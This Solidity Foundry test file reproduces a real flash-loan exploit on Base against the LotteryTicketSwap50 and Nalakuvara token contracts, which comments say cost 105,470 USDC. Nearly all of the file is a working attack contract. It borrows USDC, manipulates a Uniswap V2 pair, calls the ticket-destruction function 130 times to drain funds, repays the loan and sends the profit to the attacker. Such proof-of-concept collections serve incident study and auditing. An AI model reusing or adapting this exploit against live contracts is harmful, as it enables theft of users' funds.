// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 105470 USDC
// Attacker : https://basescan.org/address/0x3026c464d3bd6ef0ced0d49e80f171b58176ce32
// Attack Tx : https://basescan.org/tx/0x16a99aef4fab36c84ba4616668a03a5b37caa12e2fc48923dba4e711d2094699

// @Analysis
// Root cause : https://x.com/TenArmorAlert/status/1921046572353417560
// X(Twitter) Guy : https://x.com/TenArmorAlert/status/1920816516653617318

address constant UniswapV3Pool = 0xd0b53D9277642d899DF5C87A3966A349A798F224;
address constant UniswapV2Pair = 0xaDcaaB077f636d74fd50FDa7f44ad41e20A21FEE;
address constant usdc = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
address constant LotteryTicketSwap50 = 0x172119155a48DE766B126de95c2cb331D3A5c7C2;
address constant LotteryTicket50 = 0xF9260Bb78d16286270e123642ca3DE1F2289783b;
address constant Nalakuvara = 0xb39392F4b6D92a6BD560Ed260C2c488081aAB8E9;

contract Nalakuvara_LotteryTicket50_exp is Test {
    address attacker = 0x3026C464d3Bd6Ef0CeD0D49e80f171b58176Ce32;

    function setUp() public {
        vm.createSelectFork("base", 30_001_613 - 1); // Create contract block

        vm.deal(attacker, 1 ether);

        vm.label(attacker, "Attacker");
        vm.label(UniswapV3Pool, "UniswapV3Pool");
        vm.label(UniswapV2Pair, "UniswapV2Pair");
        vm.label(usdc, "USDC");
        vm.label(Nalakuvara, "Nalakuvara");
        vm.label(LotteryTicketSwap50, "LotteryTicketSwap50");
    }

    function testExploit() public {
        emit log_named_decimal_uint("USDC before attack", IUSDC(usdc).balanceOf(attacker), 6);

        vm.prank(attacker);
        AttackerC ac = new AttackerC{value: 0.2 ether}();
        ac.attack();
        vm.stopPrank();

        emit log_named_decimal_uint("USDC after attack", IUSDC(usdc).balanceOf(attacker), 6);
    }
}

contract AttackerC {
    address attacker;

    constructor() payable {
        attacker = msg.sender;
    }

    function attack() public {
        IUniswapV3Flash(UniswapV3Pool).flash(address(this), 0, 2_930_000_000_000, "");
    }

    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        IUSDC(usdc).transfer(UniswapV2Pair, 2_800_000_000_000);

        IUniswapV2Pair(UniswapV2Pair).swap(0, 71_500_000_000_000_000_000_000_000_000, address(this), "");

        IUSDC(usdc).approve(LotteryTicketSwap50, 10_000_999_990_000_000_000_000_000_000);

        ILotteryTicketSwap50(LotteryTicketSwap50).transferToken(130_000_000_000);

        IERC20(Nalakuvara).transfer(UniswapV2Pair, 71_500_000_000_000_000_000_000_000_000);

        IUniswapV2Pair(UniswapV2Pair).swap(2_908_000_000_000, 0, address(this), "");

        IERC20(LotteryTicket50).approve(LotteryTicketSwap50, 1_000_000_000_000_000_000_000_000_000);

        // uint256 i = 1;
        // while (true) {
        //     ILotteryTicketSwap50(LotteryTicketSwap50).DestructionOfLotteryTickets(20_000_000);
        //     if (IUSDC(usdc).balanceOf(address(this)) > 2_931_750_000_000) break;
        //     i++;
        // }
        // console.log("Number of iterations: ", i);

        for (uint256 i = 0; i < 130; i++) {
            ILotteryTicketSwap50(LotteryTicketSwap50).DestructionOfLotteryTickets(20_000_000);
        }

        IUSDC(usdc).transfer(UniswapV3Pool, 2_931_750_000_000); // Pay back flash loan

        uint256 profit = IUSDC(usdc).balanceOf(address(this));
        // console.log(profit);
        IUSDC(usdc).transfer(attacker, profit);
    }

    receive() external payable {}
}

interface ILotteryTicketSwap50 {
    function transferToken(uint256 amount) external returns (bool);
    function DestructionOfLotteryTickets(uint256 _amountTickets) external returns (bool);
}
